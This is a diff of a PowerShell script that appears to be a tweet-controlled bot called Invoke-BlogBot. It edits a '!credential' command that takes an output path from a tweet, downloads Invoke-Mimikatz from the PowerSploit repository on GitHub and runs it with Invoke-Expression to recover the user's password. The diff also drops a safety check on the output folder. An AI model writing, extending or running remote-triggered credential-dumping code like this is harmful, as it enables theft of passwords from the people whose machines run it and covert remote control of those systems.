@@ -229,13 +229,14 @@ Function Invoke-BlogBot {
             [string] $CmdString = 'rundll32.exe user32.dll, UpdatePerUserSystemParameters'
             Invoke-Expression $CmdString
         }
-
+        ##################################################################################################################################################
+        ####### EXPERIMENTAL
         #Implements the !credential command to recover the users password
         #!credential|c:\temp\cred.txt
         Function CredentialCommand {
             [string] $OutPath = $LatestTweet.split('|')[1]
             
-            if (Test-Path -Path (Split-Path -Parent $OutPath) -Pathtype container) {
+            
                 
             [string] $downloadURL = 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
             Write-Verbose "I am downloading from $ActualdownloadURL"
@@ -245,7 +246,7 @@ Function Invoke-BlogBot {
             $downloadedScript += $AppendString
             Invoke-Expression $downloadedScript
                 
-            }
+            
         }
     
         #Implements the !popup command to send a message to the user
